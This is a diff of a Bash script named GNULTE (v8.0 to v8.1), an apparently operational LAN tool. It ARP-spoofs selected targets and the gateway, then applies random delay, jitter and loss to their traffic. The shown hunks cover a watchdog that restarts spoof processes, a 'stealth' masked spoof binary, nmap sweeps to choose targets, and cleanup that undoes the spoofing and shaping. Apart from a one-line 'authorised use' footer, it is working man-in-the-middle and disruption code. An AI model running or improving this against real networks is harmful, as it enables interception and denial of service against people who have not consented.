         else
             log_warn "No terminal emulator found. Falling back to single monitor."
             return 1
@@ -1863,7 +2043,7 @@ generate_report() {
     local html="$outdir/report.html"
 
     {
-        echo "GNULTE v8.0 – Post-Test Report"
+        echo "GNULTE v8.1 – Post-Test Report"
         echo "==============================="
         echo "Generated : $(date)"
         echo "Interface : $INTERFACE"
@@ -1920,7 +2100,7 @@ EOF
     done
 
     echo "</table>" >> "$html"
-    echo "<p class='p'>Generated by GNULTE v8.0. Keep within authorised use.</p></body></html>" >> "$html"
+    echo "<p class='p'>Generated by GNULTE v8.1. Keep within authorised use.</p></body></html>" >> "$html"
 
     if [ -n "$EXPORT_CSV" ] && [ -f "$EXPORT_CSV" ]; then
         cp "$EXPORT_CSV" "$outdir/" 2>/dev/null
@@ -2017,13 +2197,14 @@ monitor() {
             RAND_LOSS=$((RANDOM % 10))
 
             if [ "$BANDWIDTH" -gt 0 ]; then
-                TC_CMD="tc qdisc change dev $INTERFACE parent 1:10 handle 10: netem"
+                RATE="${BANDWIDTH}kbit"
             else
-                TC_CMD="tc qdisc change dev $INTERFACE root netem"
+                RATE="1gbit"
             fi
-            TC_CMD="$TC_CMD delay ${RAND_LATENCY}ms ${RAND_JITTER}ms"
-            [ "$RAND_LOSS" -gt 0 ] && TC_CMD="$TC_CMD loss ${RAND_LOSS}%"
-            sudo $TC_CMD 2>/dev/null
+            sudo tc class change dev "$INTERFACE" parent 1: classid 1:10 htb rate "$RATE" ceil "$RATE" 2>/dev/null
+            sudo tc qdisc change dev "$INTERFACE" parent 1:10 handle 10: netem \
+                delay "${RAND_LATENCY}ms" "${RAND_JITTER}ms" \
+                ${RAND_LOSS:+loss ${RAND_LOSS}%} 2>/dev/null
         fi
 
         dash_clear
@@ -2069,13 +2250,12 @@ monitor() {
 
         # Spoof watchdog: if a spoof process died, restart both directions
         if [ "$STOPPING" != true ] && [ ${#SPOOF1_PIDS[@]} -gt 0 ]; then
+            local i
             for i in "${!SPOOF1_PIDS[@]}"; do
-                ALIVE1=true; ALIVE2=true
-                sudo kill -0 "${SPOOF1_PIDS[$i]}" 2>/dev/null || ALIVE1=false
-                sudo kill -0 "${SPOOF2_PIDS[$i]}" 2>/dev/null || ALIVE2=false
-                if [ "$ALIVE1" = false ] || [ "$ALIVE2" = false ]; then
+                if ! alive_spoof "${SPOOF1_PIDS[$i]}" || ! alive_spoof "${SPOOF2_PIDS[$i]}"; then
                     log_warn "Spoof for ${TARGETS[$i]} died – restarting"
-                    sudo kill "${SPOOF1_PIDS[$i]}" "${SPOOF2_PIDS[$i]}" 2>/dev/null
+                    kill_own_spoof "${SPOOF1_PIDS[$i]}"
+                    kill_own_spoof "${SPOOF2_PIDS[$i]}"
                     sleep 0.5
                     SPOOF1_PIDS[$i]="$(masked_spoof "$INTERFACE" "${TARGETS[$i]}" "$GATEWAY")"
                     sleep 0.5
@@ -2098,33 +2278,85 @@ monitor() {
 # -----------------------------------------------------------------------------
 # CLEANUP
 # -----------------------------------------------------------------------------
+# Restore the root qdisc that existed before we started shaping (best-effort).
+restore_qdisc() {
+    [ -n "$QDISC_BEFORE" ] || return 0
+    local -a f=($QDISC_BEFORE)
+    [ "${#f[@]}" -ge 3 ] || return 0
+    local kind="${f[1]}"
+    case "$kind" in
+        none|noqueue|nomatch) return 0 ;;
+    esac
+    local handle="${f[2]%:}"
+    # fields: qdisc <kind> <handle:> dev <name> root refcnt <n> [options...]
+    local rest=() skip=false num=0
+    for w in "${f[@]:3}"; do
+        if $skip; then skip=false; continue; fi
+        case "$w" in
+            dev) continue ;;
+            root) continue ;;
+            refcnt) skip=true; continue ;;
+        esac
+        rest+=("$w")
+    done
+    log_cmd "tc qdisc add dev $INTERFACE root ${handle:+handle $handle }$kind ${rest[*]}"
+    local -a add_cmd=(qdisc add dev "$INTERFACE" root)
+    [ -n "$handle" ] && add_cmd+=(handle "$handle")
+    add_cmd+=("$kind" "${rest[@]}")
+    if sudo tc "${add_cmd[@]}" 2>/dev/null; then
+        log_ok "Previous root qdisc restored ($kind)"
+    else
+        log_warn "Could not fully re-create previous root qdisc ($kind) — kernel default applied."
+    fi
+}
+
 cleanup() {
+    [ "$STOPPING" = true ] && return 0
+    [ "$STATE_DIRTY" = false ] && { STOPPING=true; cleanup_tmp; return 0; }
     STOPPING=true
     echo ""
     say "Shutting things down and restoring the normal connection…"
     log_info "Cleaning up..."
 
-    # Kill monitor terminals
+    # Kill monitor terminals (only the ones we spawned)
+    local PID
     for PID in "${TERMINAL_PIDS[@]}"; do
         kill "$PID" 2>/dev/null
     done
 
-    animated_bar 1 "Releasing traffic control..."
-    log_cmd "tc qdisc del dev $INTERFACE root"
-    sudo tc qdisc del dev "$INTERFACE" root 2>/dev/null
-    log_ok "Traffic control removed"
+    # Stop ARP spoofing: only our own process groups, never other users'
+    if [ ${#SPOOF1_PIDS[@]} -gt 0 ] || [ ${#SPOOF2_PIDS[@]} -gt 0 ]; then
+        animated_bar 1 "Stopping ARP spoofing..."
+        for PID in "${SPOOF1_PIDS[@]}" "${SPOOF2_PIDS[@]}"; do
+            kill_own_spoof "$PID"
+        done
+        [ "$STEALTH" = true ] && rm -f "$SPOOF_MASK_BIN" 2>/dev/null
 
-    animated_bar 1 "Stopping ARP spoofing..."
-    for PID in "${SPOOF1_PIDS[@]}" "${SPOOF2_PIDS[@]}"; do
-        sudo kill "$PID" 2>/dev/null
-    done
-    sudo killall arpspoof 2>/dev/null
-    [ "$STEALTH" = true ] && sudo killall "$(basename "$SPOOF_MASK_BIN")" 2>/dev/null
-    log_ok "ARP spoofing stopped"
+        # Help the target forget our forged ARP entry (gratuitous ARP for gateway).
+        if command -v arping &>/dev/null && [ -n "$GATEWAY" ]; then
+            sudo arping -q -c 3 -U -I "$INTERFACE" "$GATEWAY" 2>/dev/null
+            log_ok "Broadcast gateway ARP so targets re-learn the real router MAC"
+        else
+            log_info "arping not available — neighbors may take up to ~60s to refresh their ARP cache."
+        fi
+        log_ok "ARP spoofing stopped"
+    fi
 
-    log_cmd "sysctl -w net.ipv4.ip_forward=0"
-    sudo sysctl -w net.ipv4.ip_forward=0 > /dev/null 2>&1
-    log_ok "IP forwarding disabled"
+    # Restore traffic control (only if we actually built a shaping tree)
+    if [ "$QDISCS_APPLIED" = true ]; then
+        animated_bar 1 "Releasing traffic control..."
+        log_cmd "tc qdisc del dev $INTERFACE root"
+        sudo tc qdisc del dev "$INTERFACE" root 2>/dev/null
+        log_ok "Traffic control removed"
+        restore_qdisc
+    fi
+
+    # Restore IP forwarding to its original value
+    if [ "$IP_FORWARD_CHANGED" = true ]; then
+        log_cmd "sysctl -w net.ipv4.ip_forward=$ORIG_IP_FORWARD"
+        sudo sysctl -w net.ipv4.ip_forward="$ORIG_IP_FORWARD" > /dev/null 2>&1
+        log_ok "IP forwarding restored to $ORIG_IP_FORWARD"
+    fi
 
     if [ -n "$CAPTURE_PID" ]; then
         animated_bar 1 "Finishing packet capture..."
@@ -2139,6 +2371,12 @@ cleanup() {
         CAPTURE_PID=""
     fi
 
+    # Stop the sudo keep-alive helper we started at boot
+    if [ -n "$SUDO_PING_PID" ]; then
+        kill "$SUDO_PING_PID" 2>/dev/null
+        SUDO_PING_PID=""
+    fi
+
     if [ -n "$EXPORT_CSV" ]; then
         log_ok "Results exported to: $EXPORT_CSV"
     fi
@@ -2146,7 +2384,7 @@ cleanup() {
     generate_report
 
     echo ""
-    log_ok "Cleanup complete. Target(s) restored."
+    log_ok "Cleanup complete. Targets restored (ARP cache refresh may take a few seconds)."
 }
 
 # -----------------------------------------------------------------------------
@@ -2210,7 +2448,7 @@ check_duplicate_ips() {
         exit 1
     fi
 
-    local out="/tmp/gnulte_dup.txt"
+    local out="$TMP_DIR/dup.txt"
     ( sudo arp-scan --local > "$out" 2>/dev/null ) &
     local scan_pid=$!
     spinner "$scan_pid" "Scanning network for duplicate IPs..."
@@ -2222,11 +2460,13 @@ check_duplicate_ips() {
     while IFS= read -r line; do
         ip=$(echo "$line"   | awk '{print $1}')
         mac=$(echo "$line"  | awk '{print $2}')
-        [[ "$ip"  =~ ^[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+$ ]] || continue
-        [[ "$mac" =~ ^([0-9a-fA-F]{2}:){5}[0-9a-fA-F]{2}$ ]] || continue
+        valid_ip4 "$ip" || continue
+        valid_mac "$mac" || continue
         if [ -n "${ip_macs[$ip]:-}" ] && [ "${ip_macs[$ip]}" != "$mac" ]; then
             conflicts+=("$ip")
-            log_warn "CONFLICT: $ip is claimed by ${ip_macs[$ip]} AND $mac"
+            log_warn "DUPLICATE IP: $ip is claimed by BOTH"
+            log_warn "    ${ip_macs[$ip]}  and  $mac"
+            log_warn "    Two devices share one address — pings and ARP answers will be unreliable."
         else
             ip_macs[$ip]="$mac"
         fi
@@ -2235,10 +2475,11 @@ check_duplicate_ips() {
 
     echo ""
     if [ ${#conflicts[@]} -eq 0 ]; then
-        log_ok "No duplicate IPs found (all IPs answered by a single MAC)."
+        log_ok "No duplicate IPs found (every address answered by exactly one MAC)."
     else
-        unique=($(printf '%s\n' "${conflicts[@]}" | sort -u))
-        log_err "Found ${#unique[@]} IP conflict(s). A device that changes MAC or a broken DHCP lease usually causes this."
+        local -a unique=($(printf '%s\n' "${conflicts[@]}" | sort -u))
+        log_err "Found ${#unique[@]} IP conflict(s)."
+        log_info "Cause is usually two devices fighting over one address (broken DHCP lease)."
         log_info "Resolve the conflict before running degradation tests so results are trustworthy."
     fi
     echo ""
@@ -2276,7 +2517,7 @@ while [[ $# -gt 0 ]]; do
         --theme)          case " $THEME_NAMES " in *" $2 "*) THEME="$2"; apply_theme ;; *) log_err "unknown theme: $2 (options: $THEME_NAMES)"; exit 1 ;; esac; shift 2 ;;
         --settings)       settings_app; shift ;;
         --config)         edit_config; shift ;;
-        --version)        echo "GNULTE v8.0"; exit 0 ;;
+        --version)        echo "GNULTE v8.1"; exit 0 ;;
         -h|--help)        show_help; exit 0 ;;
         *)                log_err "Unknown option: $1"; show_help; exit 1 ;;
     esac
@@ -2328,15 +2569,17 @@ if [ -n "$TARGET_RANGE" ]; then
         log_info "Whitelist: ${WHITELIST[*]}"
     fi
 
-    ( sudo nmap -sn "$TARGET_RANGE" 2>/dev/null > /tmp/gnulte_range.txt ) &
+    # Structured grepable (-oG) output, not the human table
+    ( sudo nmap -sn -oG - "$TARGET_RANGE" 2>/dev/null > "$TMP_DIR/range.txt" ) &
     range_pid=$!
     spinner "$range_pid" "Scanning range..."
     wait "$range_pid"
 
-    RANGE_IPS=$(grep "Nmap scan report for" /tmp/gnulte_range.txt | awk '{print $NF}' | sed 's/[()]//g')
-    rm -f /tmp/gnulte_range.txt
+    RANGE_IPS=$(sed -n 's/^Host: \([0-9][0-9]*\.[0-9][0-9]*\.[0-9][0-9]*\.[0-9][0-9]*\) .*Status: Up$/\1/p' "$TMP_DIR/range.txt")
+    rm -f "$TMP_DIR/range.txt"
 
     for IP in $RANGE_IPS; do
+        valid_ip4 "$IP" || continue
         SKIP=false
         for W in "${WHITELIST[@]}"; do
             [[ "$IP" == "$W" ]] && SKIP=true && break
@@ -2360,15 +2603,28 @@ if [ "$DUPCHECK" = true ]; then
 fi
 
 if [ -n "$TARGET_INPUT" ]; then
-    IFS=',' read -ra TARGETS <<< "$TARGET_INPUT"
+    TARGETS=()
+    IFS=',' read -ra revised_parts <<< "$TARGET_INPUT"
+    for revised in "${revised_parts[@]}"; do
+        revised="${revised// /}"
+        if ! valid_ip4 "$revised"; then
+            log_err "Invalid target IP: '$revised'"
+            exit 1
+        fi
+        TARGETS+=("$revised")
+    done
     log_target "Direct target(s): ${TARGETS[*]}"
     echo ""
 fi
 
 if [ -n "$TARGET_MAC" ]; then
+    if ! valid_mac "$TARGET_MAC"; then
+        log_err "Invalid MAC address: '$TARGET_MAC' (expected aa:bb:cc:dd:ee:ff)"
+        exit 1
+    fi
     log_info "Resolving MAC: $TARGET_MAC"
-    IP=$(arp -a | grep -i "$TARGET_MAC" | awk '{print $1}' | sed 's/[()]//g')
-    if [ -n "$IP" ]; then
+    IP=$(ip neigh show 2>/dev/null | awk -v m="${TARGET_MAC,,}" 'tolower($5) == m { print $1; exit }')
+    if [ -n "$IP" ] && valid_ip4 "$IP"; then
         TARGETS=("$IP")
         log_target "Resolved to IP: $IP"
     else
